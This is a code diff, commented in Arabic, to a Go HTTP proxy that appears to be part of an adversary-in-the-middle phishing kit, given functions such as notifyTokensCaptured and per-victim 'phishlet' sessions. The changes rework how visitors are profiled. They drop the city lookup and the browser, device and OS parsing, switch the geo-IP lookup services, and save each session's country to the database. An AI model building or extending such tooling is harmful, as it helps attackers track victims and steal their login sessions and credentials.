@@ -605,7 +605,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										// استخدام خدمة تحديد موقع IP للحصول على بيانات البلد
 										log.Debug("محاولة استخراج معلومات البلد من عنوان IP: %s", remote_addr)
 										
-										cc, country, city := getIPGeoInfo(remote_addr)
+										cc, country := getIPGeoInfo(remote_addr)
 										if cc != "" {
 											session.SetCountryCode(cc)
 											log.Success("[%d] تم تعيين رمز البلد من IP: %s", sid, cc)
@@ -614,18 +614,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											session.SetCountry(country)
 											log.Success("[%d] تم تعيين اسم البلد من IP: %s", sid, country)
 										}
-										if city != "" {
-											session.SetCity(city)
-											log.Success("[%d] تم تعيين اسم المدينة من IP: %s", sid, city)
-										}
 									}
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
-										log.Error("فشل إنشاء الجلسة: %s", err)
+										log.Error("database: %v", err)
 									} else {
-										// استخراج وحفظ معلومات الجلسة بعد إنشائها في قاعدة البيانات
-										p.extractAndSaveSessionInfo(session, req, remote_addr)
+										// حفظ معلومات البلد بعد إنشاء الجلسة في قاعدة البيانات
+										if session.CountryCode != "" || session.Country != "" {
+											if err := p.db.SetSessionCountryInfo(session.Id, session.CountryCode, session.Country); err != nil {
+												log.Error("[%d] فشل في حفظ معلومات البلد: %v", sid, err)
+											} else {
+												log.Success("[%d] تم حفظ معلومات البلد في قاعدة البيانات بنجاح", sid)
+											}
+										}
 									}
 
 									session.RemoteAddr = remote_addr
@@ -2629,20 +2631,12 @@ func (p *HttpProxy) notifyTokensCaptured(sid string) {
 	}
 }
 
-// دالة للحصول على معلومات البلد والمدينة من عنوان IP
-func getIPGeoInfo(ipAddress string) (countryCode, country, city string) {
-	if ipAddress == "" || ipAddress == "127.0.0.1" || strings.HasPrefix(ipAddress, "192.168.") {
-		return "", "", ""
-	}
+// دالة للحصول على معلومات البلد من عنوان IP
+func getIPGeoInfo(ipAddress string) (countryCode string, country string) {
+	log.Debug("محاولة استخراج معلومات البلد من عنوان IP: %s", ipAddress)
 	
-	// تنظيف عنوان IP (إزالة رقم المنفذ إن وجد)
-	parts := strings.Split(ipAddress, ":")
-	cleanIP := parts[0]
-	
-	log.Debug("محاولة استخراج معلومات البلد والمدينة من عنوان IP: %s", cleanIP)
-	
-	// استخدام ipapi.co للحصول على معلومات البلد والمدينة
-	url := "https://ipapi.co/" + cleanIP + "/json/"
+	// استخدام freegeoip.app للحصول على معلومات البلد
+	url := "https://freegeoip.app/json/" + ipAddress
 	
 	client := &http.Client{
 		Timeout: 5 * time.Second,
@@ -2652,53 +2646,39 @@ func getIPGeoInfo(ipAddress string) (countryCode, country, city string) {
 	if err != nil {
 		log.Error("خطأ في الاتصال بخدمة تحديد الموقع الجغرافي: %v", err)
 		// استخدام خدمة احتياطية
-		return tryBackupGeoService(cleanIP)
+		return tryBackupGeoService(ipAddress)
 	}
 	defer resp.Body.Close()
 	
 	if resp.StatusCode != http.StatusOK {
 		log.Error("خدمة تحديد الموقع الجغرافي أعادت حالة خطأ: %d", resp.StatusCode)
 		// استخدام خدمة احتياطية
-		return tryBackupGeoService(cleanIP)
+		return tryBackupGeoService(ipAddress)
 	}
 	
 	var result map[string]interface{}
-	bodyBytes, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Error("فشل قراءة استجابة خدمة تحديد موقع IP: %v", err)
-		return tryBackupGeoService(cleanIP)
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		log.Error("خطأ في فك ترميز استجابة خدمة تحديد الموقع الجغرافي: %v", err)
+		// استخدام خدمة احتياطية
+		return tryBackupGeoService(ipAddress)
 	}
 	
-	err = json.Unmarshal(bodyBytes, &result)
-	if err != nil {
-		log.Error("فشل فك ترميز استجابة خدمة تحديد موقع IP: %v", err)
-		return tryBackupGeoService(cleanIP)
-	}
+	// استخراج رمز البلد واسم البلد
+	countryCode, _ = result["country_code"].(string)
+	country, _ = result["country_name"].(string)
 	
-	// استخراج رمز البلد واسم البلد والمدينة
-	if cc, ok := result["country_code"].(string); ok {
-		countryCode = cc
-	}
+	log.Debug("تم الحصول على معلومات البلد من عنوان IP: %s", ipAddress)
+	log.Debug("تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
 	
-	if c, ok := result["country_name"].(string); ok {
-		country = c
-	}
-	
-	if ct, ok := result["city"].(string); ok {
-		city = ct
-	}
-	
-	log.Debug("تم الحصول على معلومات الموقع: البلد=%s، المدينة=%s", country, city)
-	
-	return countryCode, country, city
+	return countryCode, country
 }
 
-// دالة احتياطية للحصول على معلومات البلد والمدينة من خدمة بديلة
-func tryBackupGeoService(ipAddress string) (countryCode, country, city string) {
-	log.Debug("محاولة استخدام خدمة بديلة للحصول على معلومات البلد والمدينة")
+// دالة احتياطية للحصول على معلومات البلد من خدمة بديلة
+func tryBackupGeoService(ipAddress string) (countryCode string, country string) {
+	log.Debug("محاولة استخدام خدمة بديلة للحصول على معلومات البلد")
 	
-	// استخدام ipinfo.io كخدمة بديلة
-	url := "https://ipinfo.io/" + ipAddress + "/json"
+	// استخدام خدمة ipapi.co للحصول على معلومات البلد
+	url := "https://ipapi.co/" + ipAddress + "/json/"
 	
 	client := &http.Client{
 		Timeout: 5 * time.Second,
@@ -2707,185 +2687,33 @@ func tryBackupGeoService(ipAddress string) (countryCode, country, city string) {
 	resp, err := client.Get(url)
 	if err != nil {
 		log.Error("فشل استعلام خدمة تحديد موقع IP البديلة: %v", err)
-		return "", "", ""
+		return "", ""
 	}
 	defer resp.Body.Close()
 	
 	if resp.StatusCode != http.StatusOK {
 		log.Error("خدمة تحديد موقع IP البديلة أعادت رمز حالة غير صحيح: %d", resp.StatusCode)
-		return "", "", ""
+		return "", ""
 	}
 	
 	var result map[string]interface{}
 	err = json.NewDecoder(resp.Body).Decode(&result)
 	if err != nil {
 		log.Error("فشل فك ترميز استجابة خدمة تحديد موقع IP البديلة: %v", err)
-		return "", "", ""
+		return "", ""
 	}
 	
-	// استخراج البيانات
-	if cc, ok := result["country"].(string); ok {
+	cc, ok := result["country_code"].(string)
+	if ok && cc != "" {
 		countryCode = cc
 	}
 	
-	// الخدمة البديلة قد لا توفر اسم البلد، فقط الرمز
-	if countryCode != "" {
-		// تحويل رمز البلد إلى اسم البلد
-		countryMap := map[string]string{
-			"US": "United States", "GB": "United Kingdom", "CA": "Canada", "AU": "Australia", 
-			"DE": "Germany", "FR": "France", "IT": "Italy", "JP": "Japan", "CN": "China", 
-			"RU": "Russia", "BR": "Brazil", "IN": "India", "EG": "Egypt", "SA": "Saudi Arabia",
-			"AE": "United Arab Emirates", "QA": "Qatar", "KW": "Kuwait", "OM": "Oman", 
-			"BH": "Bahrain", "JO": "Jordan", "LB": "Lebanon", "IR": "Iran", "IQ": "Iraq",
-			"SY": "Syria", "PS": "Palestine", "YE": "Yemen", "MA": "Morocco", "DZ": "Algeria",
-			"TN": "Tunisia", "LY": "Libya", "SD": "Sudan",
-		}
-		if name, exists := countryMap[countryCode]; exists {
-			country = name
-		} else {
-			country = "Unknown"
-		}
+	c, ok := result["country_name"].(string)
+	if ok && c != "" {
+		country = c
 	}
 	
-	if ct, ok := result["city"].(string); ok {
-		city = ct
-	}
+	log.Debug("الخدمة البديلة - تم الحصول على معلومات البلد: رمز البلد=%s، البلد=%s", countryCode, country)
 	
-	log.Debug("الخدمة البديلة - تم الحصول على: رمز البلد=%s، البلد=%s، المدينة=%s", countryCode, country, city)
-	
-	return countryCode, country, city
-}
-
-// دالة لاستخراج معلومات المتصفح والجهاز ونظام التشغيل من User-Agent
-func parseUserAgent(userAgent string) (browser, device, os string) {
-	ua := strings.ToLower(userAgent)
-	
-	// تحديد نوع المتصفح
-	switch {
-	case strings.Contains(ua, "firefox"):
-		browser = "Firefox"
-	case strings.Contains(ua, "chrome") && !strings.Contains(ua, "edg") && !strings.Contains(ua, "opr"):
-		browser = "Chrome"
-	case strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome"):
-		browser = "Safari"
-	case strings.Contains(ua, "edg"):
-		browser = "Edge"
-	case strings.Contains(ua, "opr") || strings.Contains(ua, "opera"):
-		browser = "Opera"
-	case strings.Contains(ua, "msie") || strings.Contains(ua, "trident"):
-		browser = "Internet Explorer"
-	default:
-		browser = "Unknown"
-	}
-	
-	// تحديد نظام التشغيل
-	switch {
-	case strings.Contains(ua, "windows"):
-		os = "Windows"
-	case strings.Contains(ua, "mac os"):
-		os = "macOS"
-	case strings.Contains(ua, "iphone"):
-		os = "iOS"
-	case strings.Contains(ua, "ipad"):
-		os = "iOS"
-	case strings.Contains(ua, "android"):
-		os = "Android"
-	case strings.Contains(ua, "linux"):
-		os = "Linux"
-	default:
-		os = "Unknown"
-	}
-	
-	// تحديد نوع الجهاز
-	switch {
-	case strings.Contains(ua, "iphone"):
-		device = "iPhone"
-	case strings.Contains(ua, "ipad"):
-		device = "iPad"
-	case strings.Contains(ua, "android") && (strings.Contains(ua, "mobile") || strings.Contains(ua, "phone")):
-		device = "Android Phone"
-	case strings.Contains(ua, "android") && strings.Contains(ua, "tablet"):
-		device = "Android Tablet"
-	case strings.Contains(ua, "windows phone"):
-		device = "Windows Phone"
-	case os == "Android":
-		device = "Android Device" // إذا لم نستطع تحديد ما إذا كان هاتفاً أو جهاز لوحي
-	case os == "Windows" || os == "macOS" || os == "Linux":
-		device = "Desktop"
-	default:
-		device = "Unknown"
-	}
-	
-	return browser, device, os
-}
-
-// cleanupSession تنظف الجلسة المحددة من الذاكرة
-// هذه الدالة منفصلة عن handleSession التي تتحقق من وجود المضيف في قائمة المضيفين المعتمدة
-func (p *HttpProxy) cleanupSession(sid string) {
-	if p.developer {
-		log.Debug("SESSION INIT: %s", sid)
-	}
-	for se, s := range p.sessions {
-		if s.Id == sid {
-			if !s.IsDone {
-				s.IsDone = true
-			}
-			if p.developer {
-				log.Debug("SESSION CLEARED: %s", se)
-			}
-			delete(p.sessions, se)
-			break
-		}
-	}
-}
-
-// أضف هذا الرمز في المكان المناسب لحفظ بيانات الجلسة
-// في الدالة handleSession أو handleRequest
-func (p *HttpProxy) extractAndSaveSessionInfo(session *Session, req *http.Request, remote_addr string) {
-	// استخراج معلومات البلد والمدينة
-	cc, country, city := getIPGeoInfo(remote_addr)
-	
-	// استخراج معلومات المتصفح والجهاز ونظام التشغيل
-	userAgent := req.Header.Get("User-Agent")
-	browser, device, os := parseUserAgent(userAgent)
-	
-	// تحديث الجلسة بالمعلومات الجديدة
-	if cc != "" {
-		session.SetCountryCode(cc)
-		log.Success("[%s] تم تعيين رمز البلد من IP: %s", session.Id, cc)
-	}
-	
-	if country != "" {
-		session.SetCountry(country)
-		log.Success("[%s] تم تعيين اسم البلد من IP: %s", session.Id, country)
-	}
-	
-	if city != "" {
-		session.SetCity(city)
-		log.Success("[%s] تم تعيين اسم المدينة من IP: %s", session.Id, city)
-	}
-	
-	// تعيين معلومات المتصفح والجهاز
-	session.SetBrowser(browser)
-	log.Success("[%s] تم تعيين نوع المتصفح: %s", session.Id, browser)
-	
-	session.SetDevice(device)
-	log.Success("[%s] تم تعيين نوع الجهاز: %s", session.Id, device)
-	
-	session.SetOS(os)
-	log.Success("[%s] تم تعيين نظام التشغيل: %s", session.Id, os)
-	
-	// حفظ معلومات البلد في قاعدة البيانات
-	err := p.db.SetSessionCountryInfo(session.Id, cc, country)
-	if err != nil {
-		log.Error("[%s] فشل حفظ معلومات البلد في قاعدة البيانات: %v", session.Id, err)
-	} else {
-		log.Success("[%s] تم حفظ معلومات البلد في قاعدة البيانات", session.Id)
-		
-		// تحديث الحقول الإضافية باستخدام SetSessionCustom
-		p.db.SetSessionCustom(session.Id, "city", city)
-		p.db.SetSessionCustom(session.Id, "browser", browser)
-		p.db.SetSessionCustom(session.Id, "device", device)
-		p.db.SetSessionCustom(session.Id, "os", os)
-	}
+	return countryCode, country
 }
